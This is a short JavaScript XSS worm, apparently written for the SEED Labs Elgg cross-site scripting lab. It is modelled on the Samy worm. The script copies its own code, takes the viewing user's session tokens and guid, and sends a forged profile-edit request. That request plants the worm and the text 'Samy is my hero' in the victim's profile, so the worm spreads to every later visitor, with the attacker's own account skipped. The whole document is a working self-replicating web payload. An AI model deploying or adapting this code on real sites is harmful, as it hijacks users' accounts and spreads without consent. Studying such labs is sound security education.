<script type="text/javascript" id="worm">
    window.onload = function () {
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script > ";
// put all the pieces together, and apply the URL encoding
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
// set the content of the description field and access level
var desc = "&description=Samy is my hero" + wormCode;
desc += "&accesslevel[description]=2";
var guid = "&guid=" + elgg.session.user.guid;
var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
var name = "&name=" + elgg.session.user.name;
// var desc = "&description=Samy is my hero" + "&accesslevel[description]=2";

// construct the content of the url
var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
var content = token + ts + name + desc + guid;
if (elgg.session.user.guid != 47) {
    //Create and send Ajax request to midift the profile
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}
}
</script >